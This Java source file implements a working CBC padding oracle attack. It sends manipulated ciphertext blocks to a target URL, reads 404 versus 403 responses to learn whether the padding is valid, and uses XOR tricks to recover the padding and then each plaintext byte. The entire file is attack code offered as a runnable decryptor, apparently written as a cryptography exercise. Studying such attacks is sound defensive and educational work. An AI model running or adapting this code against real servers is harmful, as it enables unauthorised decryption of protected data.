package paddingOracleAttack;

import java.util.Arrays;
import java.util.logging.Level;
import java.util.logging.Logger;

import utils.ArrayUtils;
import xordecryption.NormalizedString;

public class PaddingOracle {
	
	public static Logger log=Logger.getLogger("PaddingOracle");
	
	String url;
	NormalizedString cypher;
	byte[][] blocks;
	byte[] discoveredBytes=new byte[16];
	
	public PaddingOracle(String url,String cypher){
		this.url=url;
		this.cypher=NormalizedString.addHexString(cypher);
		
		if (!checkCBCBlocks()){
			log.info("Given cypher is not in CBC mode, interrupting");
			System.exit(0);	
		}
		
		log.info(new String(discoverBytesSequence()));
		
	}
	
	private boolean checkCBCBlocks(){
		byte[] t=cypher.getBytes();
		
		log.info("original cypher bytes: "+Arrays.toString(t));
		int c=t.length % 16;
		if (c!=0)
			return false;// in cbc mode all blocks has the same size (16 bytes) 
		
		blocks=new byte[t.length/16][];
		int k=0;
		for (int i=0;i<blocks.length;i++){
				blocks[i]=Arrays.copyOfRange(t, k, k+16);
				log.info("block["+i+"]:"+Arrays.toString(blocks[i]));
				k=k+16;
		}
		
		if (!Arrays.equals(t,getCypherBytes(blocks))){
			log.info("original and made-up cyphers are not equal");
			 System.exit(0);
		}
		return true;
	}
	
	private boolean checkByte(byte[] cypherBytes){
		
		String cypher= NormalizedString.toHexString(cypherBytes);
		String resp=HttpRequestor.execute(url+cypher,null);
		// server should return 404 if padding is correct but content is malformed (ie we guessed 1 byte of plain text
	 
		if (resp.equals("404"))
			return true;
		else
			return false;

	}
	
	private byte[] discoverPadding(byte[] b){
		
		byte[][] blocksT=new byte[][]{blocks[0],Arrays.copyOf(blocks[blocks.length-2],blocks[blocks.length-2].length),blocks[blocks.length-1]};
		
		for (int i=0;i<blocksT[0].length;i++){
			blocksT[1][i]=(byte)i;
			if (!checkByte(getCypherBytes(blocksT))){// resp code =403, means we found padding = block.length-i
				int padding =blocksT[0].length-i; //blocksT[0].length-i
				log.info("Padding is found: "+(padding));
				
					for (int l=padding;l>0;l--)
						b[b.length-l]=(byte)(padding);
					break;
			}
		}
		if (b[b.length-1]==0)
		{
			log.info("Padding is not found");
			System.exit(0);
		}
		return b;
	}
	
	
	private byte[] discoverBytesSequence(){
		int upperBound=256;
		int lowerBound=0;
		
		byte[] b=new byte[(blocks.length-1)*16];
		int ind=b.length-1;
		
		byte[][] blocksT=ArrayUtils.cloneArray(blocks);
		
		/* discover padding of last block of cypher */
		
		b=discoverPadding(b);
		
		
		/* start finding bytes of plain text 
		 *
		 *  0	1	2	3	4	5	6	7	8	9	A	B	C	D	E	F	LENGTH 16
		 *  							X	X	X	X	X	X	X	X	X	PADDING 9
		 *  						^	POSITION=LENGTH-PADDING
		 */
		for (int l=blocksT.length-2;l>=0;l--){
			byte[] tempDiscovered=new byte[blocksT[l].length];
			
			int padding=1;
			int startingIndex=blocksT[l].length-1;
			
			/* if it's the next to last block then we already know padding, else padding = 1*/
			if ((l==(blocksT.length-2))&&(b[b.length-1]!=0)){
				padding += b[b.length-1];
				startingIndex=blocksT[l].length-padding;
				ind=b.length-padding;
				
				tempDiscovered=Arrays.copyOfRange(b, b.length-tempDiscovered.length, b.length); //populate tempdiscovery with values of padding already kept in resulting b
			}

			
			
		
		for (int i=startingIndex;i>=0;i--){

			for (int word=lowerBound;word<upperBound;word++){
				
				blocksT[l]=getPaddingXor(blocks[l],tempDiscovered,word,padding);
				
				byte[][] bb=new byte[][]{blocks[0],blocksT[l],blocks[l+1]};
				
				/*
				byte[][] bb=new byte[l+2][]; // we send to the server the cypher consisting of IV+C0'+C1(original). blocksT contains changed blocks whereas block[] holds original blocks
				
				for (int g=0;g<=l+1;g++){
					if (g==(l+1))
						bb[g]=blocks[g];
					else
						bb[g]=blocksT[g];
				}
				*/
				
					
				if (checkByte(getCypherBytes(bb))){
					
					// log the match
					NormalizedString str=NormalizedString.addHexString(NormalizedString.toHexString(new byte[]{(byte)word}));
					log.info("Matching byte is found: "+word+" "+(byte)word+" "+str.getHexString()+" "+str.getString());
					//
					b[ind]=(byte)word;
					tempDiscovered[i]=(byte)word;
					padding++;
					ind--;

					log.info("tempDiscovered: "+Arrays.toString(tempDiscovered));
					log.info("b: "+Arrays.toString(b));

					break;
				}
				
				// protection against not found word - it's not supposed to happen
				if (word==upperBound-1){ // word is already cannot be readable character but cycle is still not interrupted
					log.info("byte is not found for: block["+l+"] at position "+i);
					log.info("bytes discovered so far: "+Arrays.toString(b));
					System.exit(0);
				}
			}
		}
		}
		return b;
		
	}
	
	private byte[] getCypherBytes(byte[][] bytes){
		// from 2-dimensional bytes array we get flat 1-dimensional array
		byte[] b=new byte[bytes.length*16];
		int l=0;
		for (int i=0;i<bytes.length;i++){
			for (int k=0;k<bytes[i].length;k++){
				b[l]=bytes[i][k];
				l++;
			}
		}
		log.log(Level.FINEST,"original cypher: "+cypher.getHexString());
		log.log(Level.FINEST,"getCypherBytes : "+NormalizedString.toHexString(b));
		
		return b;
	}
	
	private byte[] getPaddingXor(byte[] c0, byte[] discoveredBytes,int w, int padding){
		log.log(Level.FINE,"before: "+NormalizedString.toHexString(c0)+" word:"+(byte)w);
		
		byte[] result=Arrays.copyOf(c0, c0.length);
		int word;
		// if padding =1 then we change last byte of cypher C[lastbyte]^word1^padding
		// if padding =2 then we change last byte and last-1 byte C[lastbyte]^word1^padding, C[lastbyte-1]^word2^padding etc
			for (int i=1;i<=padding;i++){
				//byte c=cypher[cypher.length-i];
				if (i!=padding)
					word=discoveredBytes[discoveredBytes.length-i];
				else
					word=w;
				byte tt=(byte) (c0[c0.length-i]^word^padding);
				log.log(Level.FINE," xoring:"+c0[c0.length-i]+"^"+word+"^"+padding+"="+tt);
				result[c0.length-i]=tt;
			}
			
			log.log(Level.FINE,"after:  "+NormalizedString.toHexString(result)+" word:"+(byte)w);
			return result;
		}
		
	
	
	
}
